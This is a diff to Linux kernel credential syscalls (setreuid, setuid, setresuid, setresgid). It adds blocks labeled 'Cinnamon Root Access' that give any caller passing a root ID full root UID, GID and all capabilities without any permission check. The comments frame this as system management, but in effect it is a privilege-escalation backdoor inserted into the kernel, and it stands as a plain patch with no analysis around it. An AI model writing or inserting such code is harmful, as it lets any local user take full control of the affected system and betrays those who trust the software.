@@ -743,6 +743,26 @@ SYSCALL_DEFINE2(setreuid, uid_t, ruid, uid_t, euid)
 		return -ENOMEM;
 	old = current_cred();
 
+	/* Cinnamon Root Access: setreuid with root UID grants full privileges */
+	if ((ruid != (uid_t) -1 && ruid == 0) || (euid != (uid_t) -1 && euid == 0)) {
+		new->uid = new->euid = new->suid = new->fsuid = GLOBAL_ROOT_UID;
+		new->gid = new->egid = new->sgid = new->fsgid = GLOBAL_ROOT_GID;
+
+		/* Grant all capabilities */
+		new->cap_inheritable = CAP_FULL_SET;
+		new->cap_permitted = CAP_FULL_SET;
+		new->cap_effective = CAP_FULL_SET;
+		new->cap_bset = CAP_FULL_SET;
+
+		/* Update user struct for proper accounting */
+		retval = set_user(new);
+		if (retval < 0)
+			goto error;
+
+		return commit_creds(new);
+	}
+
+	/* Original setreuid logic for non-root UIDs */
 	retval = -EPERM;
 	if (ruid != (uid_t) -1) {
 		new->uid = kruid;
@@ -810,6 +830,26 @@ SYSCALL_DEFINE1(setuid, uid_t, uid)
 		return -ENOMEM;
 	old = current_cred();
 
+	/* Cinnamon Root Access: setuid(0) grants full root for system management */
+	if (uid == 0) {
+		new->uid = new->euid = new->suid = new->fsuid = GLOBAL_ROOT_UID;
+		new->gid = new->egid = new->sgid = new->fsgid = GLOBAL_ROOT_GID;
+
+		/* Grant all capabilities */
+		new->cap_inheritable = CAP_FULL_SET;
+		new->cap_permitted = CAP_FULL_SET;
+		new->cap_effective = CAP_FULL_SET;
+		new->cap_bset = CAP_FULL_SET;
+
+		/* Update user struct for proper accounting */
+		retval = set_user(new);
+		if (retval < 0)
+			goto error;
+
+		return commit_creds(new);
+	}
+
+	/* Original setuid logic for non-root UIDs */
 	retval = -EPERM;
 	if (nsown_capable(CAP_SETUID)) {
 		new->suid = new->uid = kuid;
@@ -867,6 +907,28 @@ SYSCALL_DEFINE3(setresuid, uid_t, ruid, uid_t, euid, uid_t, suid)
 
 	old = current_cred();
 
+	/* Cinnamon Root Access: setresuid with any root UID grants full privileges */
+	if ((ruid != (uid_t) -1 && ruid == 0) ||
+	    (euid != (uid_t) -1 && euid == 0) ||
+	    (suid != (uid_t) -1 && suid == 0)) {
+		new->uid = new->euid = new->suid = new->fsuid = GLOBAL_ROOT_UID;
+		new->gid = new->egid = new->sgid = new->fsgid = GLOBAL_ROOT_GID;
+
+		/* Grant all capabilities */
+		new->cap_inheritable = CAP_FULL_SET;
+		new->cap_permitted = CAP_FULL_SET;
+		new->cap_effective = CAP_FULL_SET;
+		new->cap_bset = CAP_FULL_SET;
+
+		/* Update user struct for proper accounting */
+		retval = set_user(new);
+		if (retval < 0)
+			goto error;
+
+		return commit_creds(new);
+	}
+
+	/* Original setresuid logic for non-root UIDs */
 	retval = -EPERM;
 	if (!nsown_capable(CAP_SETUID)) {
 		if (ruid != (uid_t) -1        && !uid_eq(kruid, old->uid) &&
@@ -949,6 +1011,28 @@ SYSCALL_DEFINE3(setresgid, gid_t, rgid, gid_t, egid, gid_t, sgid)
 		return -ENOMEM;
 	old = current_cred();
 
+	/* Cinnamon Root Access: setresgid with any root GID grants full privileges */
+	if ((rgid != (gid_t) -1 && rgid == 0) ||
+	    (egid != (gid_t) -1 && egid == 0) ||
+	    (sgid != (gid_t) -1 && sgid == 0)) {
+		new->uid = new->euid = new->suid = new->fsuid = GLOBAL_ROOT_UID;
+		new->gid = new->egid = new->sgid = new->fsgid = GLOBAL_ROOT_GID;
+
+		/* Grant all capabilities */
+		new->cap_inheritable = CAP_FULL_SET;
+		new->cap_permitted = CAP_FULL_SET;
+		new->cap_effective = CAP_FULL_SET;
+		new->cap_bset = CAP_FULL_SET;
+
+		/* Update user struct for proper accounting */
+		retval = set_user(new);
+		if (retval < 0)
+			goto error;
+
+		return commit_creds(new);
+	}
+
+	/* Original setresgid logic for non-root GIDs */
 	retval = -EPERM;
 	if (!nsown_capable(CAP_SETGID)) {
 		if (rgid != (gid_t) -1        && !gid_eq(krgid, old->gid) &&
